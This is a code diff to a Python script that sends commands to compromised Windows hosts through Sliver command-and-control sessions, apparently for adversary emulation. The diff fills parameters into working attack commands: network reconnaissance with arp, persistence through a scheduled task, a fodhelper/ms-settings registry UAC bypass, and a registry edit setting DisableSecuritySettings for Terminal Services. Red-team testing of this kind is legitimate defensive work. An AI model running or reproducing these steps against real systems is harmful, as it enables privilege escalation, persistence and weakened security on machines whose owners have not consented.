@@ -63,7 +63,7 @@ async def main():
     sliver_sessionid = await sliver_executor.select_sessions()
 
     confirm_action()
-    commands = """
+    commands = f"""
     arp -a
     """
     await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)
@@ -133,8 +133,8 @@ async def main():
     if not user_input and False:
         raise ValueError("Missing required parameter: time")
     user_params["time"] = user_input
-    commands = """
-    SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
+    commands = f"""
+    SCHTASKS /Create /SC ONCE /TN spawn /TR {user_params["task_command"]} /ST {user_params["time"]}
     """
     await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)
 
@@ -263,8 +263,8 @@ async def main():
     if not user_input and False:
         raise ValueError("Missing required parameter: executable_binary")
     user_params["executable_binary"] = user_input
-    commands = """
-    reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
+    commands = f"""
+    reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "{user_params["executable_binary"]}" /f
     reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
     fodhelper.exe
     """
@@ -308,7 +308,7 @@ async def main():
     print_finished_message()
 
     confirm_action()
-    commands = """
+    commands = f"""
     reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t REG_DWORD /d 1 /f
     """
     await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)
